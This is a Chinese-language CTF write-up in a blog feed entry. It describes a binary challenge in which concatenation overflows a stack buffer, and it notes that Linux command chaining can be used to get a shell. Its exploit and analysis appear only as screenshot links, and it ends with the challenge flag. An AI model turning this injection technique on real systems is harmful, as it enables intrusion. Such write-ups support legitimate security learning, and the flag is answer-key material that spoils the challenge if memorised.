    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="文件保护"><a href="#文件保护" class="headerlink" title="文件保护"></a>文件保护</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1613979515261-f2e95315-4444-49fd-b77b-bbf6177c178e.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-22%2015.38.31.png&originHeight=280&originWidth=1158&size=45610&status=done&style=none&width=1158" alt="截屏2021-02-22 15.38.31.png"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1613979565846-21167479-d377-4aac-ad76-3216c7af248b.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-22%2015.39.20.png&originHeight=414&originWidth=1530&size=127888&status=done&style=none&width=1530" alt="截屏2021-02-22 15.39.20.png"><br>IDA 分析：read 时候没有发生溢出，但是由于 dest 栈空间限制，拼接之后会发生溢出，但是查看栈空间之后无法得到任何有效信息。</p><h2 id="知识链接"><a href="#知识链接" class="headerlink" title="知识链接"></a>知识链接</h2><p>上网搜了一下，发现 Linux 的命令行是可以单行执行多个命令的：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1613979755261-63b0e390-fc34-467c-8253-5e381775e3d8.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-22%2015.42.31.png&originHeight=154&originWidth=2064&size=35040&status=done&style=none&width=2064" alt="截屏2021-02-22 15.42.31.png"><br>或者是</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1613979795307-20a81988-6800-45a4-8be8-59800df4b332.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-22%2015.43.00.png&originHeight=226&originWidth=1990&size=43571&status=done&style=none&width=1990" alt="截屏2021-02-22 15.43.00.png"></h2><p>因此我们可以使用这个特性来 getshell</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1613980049761-b1923087-2a52-41f1-8ce0-37e47ba59ff3.png#align=left&display=inline&height=518&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-22%2015.47.23.png&originHeight=518&originWidth=1336&size=60137&status=done&style=none&width=1336" alt="截屏2021-02-22 15.47.23.png"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>flag{e8ef6d27-255a-4421-bb96-24347e235ce3}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
